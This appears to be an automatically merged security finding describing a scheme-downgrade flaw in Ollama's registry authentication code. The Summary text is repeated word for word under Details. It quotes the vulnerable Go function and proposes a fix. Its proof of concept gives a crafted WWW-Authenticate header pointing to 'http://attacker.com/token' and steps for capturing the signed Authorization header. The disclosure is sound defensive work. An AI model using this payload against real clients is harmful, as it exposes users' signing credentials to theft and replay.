## Summary

`server/auth.go:53-100` guards the token endpoint URL against cross-host leakage by comparing `redirectURL.Host != originalHost`. It does NOT compare schemes. A malicious registry (or MITM at TLS termination) can respond with:

```
HTTP/1.1 401 Unauthorized
WWW-Authenticate: Bearer realm="http://registry.ollama.ai/token",service="registry.ollama.ai",scope="repository:library/foo:pull"
```

Even when the original connection was HTTPS, the host-equality check passes (both are `registry.ollama.ai`), and `makeRequest` sends the ed25519-signed Authorization header to the `http://` URL in plaintext. Any MITM on the HTTP segment captures a valid ed25519 signature + public key that binds the victim's identity to the registry request, enabling token theft and replay against the true registry.

## Details

`server/auth.go:53-100` guards the token endpoint URL against cross-host leakage by comparing `redirectURL.Host != originalHost`. It does NOT compare schemes. A malicious registry (or MITM at TLS termination) can respond with:

```
HTTP/1.1 401 Unauthorized
WWW-Authenticate: Bearer realm="http://registry.ollama.ai/token",service="registry.ollama.ai",scope="repository:library/foo:pull"
```

Even when the original connection was HTTPS, the host-equality check passes (both are `registry.ollama.ai`), and `makeRequest` sends the ed25519-signed Authorization header to the `http://` URL in plaintext. Any MITM on the HTTP segment captures a valid ed25519 signature + public key that binds the victim's identity to the registry request, enabling token theft and replay against the true registry.

### Location

- `server/auth.go:53-100` — `getAuthorizationToken`
- `server/auth.go:60` — `if redirectURL.Host != originalHost { return ..., error }` (Host only; no Scheme check)
- `server/auth.go:75` — `makeRequest(ctx, http.MethodGet, redirectURL, headers, ...)` — sends signed header over whatever scheme
- `server/auth.go:65` — `fmt.Sprintf("%s,%s,%s", http.MethodGet, redirectURL.String(), ...)` — signed challenge includes full URL including scheme; so the signature itself is over the HTTP URL, usable only against that URL by the MITM — but the public key is leaked along with a valid request signature, which can be used to authenticate other requests if the user's key identity is accepted by the main registry.

### Attacker Control

- Malicious registry (easy): returns a crafted `WWW-Authenticate` header.
- MITM on HTTPS → TLS intercept (requires interception capability or hostile CA): injects the `WWW-Authenticate` header on the 401 response.
- MITM on the HTTP token path (easy once downgraded): sniff passive.

### Trust Boundary Crossed

TLS-protected registry channel → plaintext HTTP. Violates the integrity claim of ed25519 signatures by exposing them on a plaintext channel.

### Evidence

```go
// server/auth.go:53-78
func getAuthorizationToken(ctx context.Context, challenge registryChallenge, originalHost string) (string, error) {
    redirectURL, err := challenge.URL()
    if err != nil {
        return "", err
    }

    // Validate that the realm host matches the original request host to prevent sending tokens cross-origin.
    if redirectURL.Host != originalHost {
        return "", fmt.Errorf("realm host %q does not match original host %q", redirectURL.Host, originalHost)
    }
    // <-- NO scheme check here; redirectURL.Scheme can be "http"

    sha256sum := sha256.Sum256(nil)
    data := []byte(fmt.Sprintf("%s,%s,%s", http.MethodGet, redirectURL.String(), base64.StdEncoding.EncodeToString([]byte(hex.EncodeToString(sha256sum[:])))))

    headers := make(http.Header)
    signature, err := auth.Sign(ctx, data)
    ...
    headers.Add("Authorization", signature)

    response, err := makeRequest(ctx, http.MethodGet, redirectURL, headers, nil, &registryOptions{})
    ...
}
```

## Root Cause

Validated rationale: server/auth.go:60 checks redirectURL.Host != originalHost but never asserts Scheme == "https"; a realm="http://registry/token" passes, causing the ed25519-signed Authorization header to be sent over plaintext — Advocate found no scheme enforcement anywhere in the getAuthorizationToken path.

Primary cited code reference: `server/auth.go:53`.

Merge extraction sink line: - `server/auth.go:53-100` — `getAuthorizationToken`

An adversarial review was preserved alongside the draft and should be consulted for counter-arguments and any severity challenge.

## Proof of Concept

Merge-normalized status: `**executed**.`.

No concrete evidence artifacts were preserved under `evidence/` during the merge.

1. Attacker controls `attacker.com` (or MITMs `registry.ollama.ai`).
2. Victim runs `ollama pull attacker.com/foo:latest`.
3. Attacker's registry responds 401 to `GET /v2/foo/manifests/latest` with:
   ```
   WWW-Authenticate: Bearer realm="http://attacker.com/token",service="attacker.com",scope="repository:foo:pull"
   ```
4. Ollama sends `GET http://attacker.com/token?ts=...&nonce=...&service=attacker.com&scope=...` with header `Authorization: <ed25519 pubkey>:<sig over "GET,<full-url>,b64(hex(sha256('')))">` over plaintext HTTP.
5. Attacker captures pubkey + signature from their own HTTP access log; or a network observer captures from pcap.

Debate context: Tracer confirmed line 60 checks Host only. Advocate searched for scheme enforcement in `getAuthorizationToken`, `makeRequest`, and the `http.Client` setup — none found. The fix is `if redirectURL.Scheme != "https" && originalScheme == "https" { return ..., error }`.

## Impact

- Token theft: the token returned by the attacker's HTTP endpoint is attacker-controlled (they set the response body); the signed request headers are captured for use against the true registry.
- Signature leakage: the ed25519 public key and a valid signature binding it to a real-looking request (method + URL + empty-body hash) are exposed.
- Replay attacks against any ollama.com / registry.ollama.ai endpoints that accept the same signature scheme (see Finding 014 for the related replay gap).

_Synthesized during merge normalization from `archon/findings/M2-realm-http-downgrade/draft.md`._
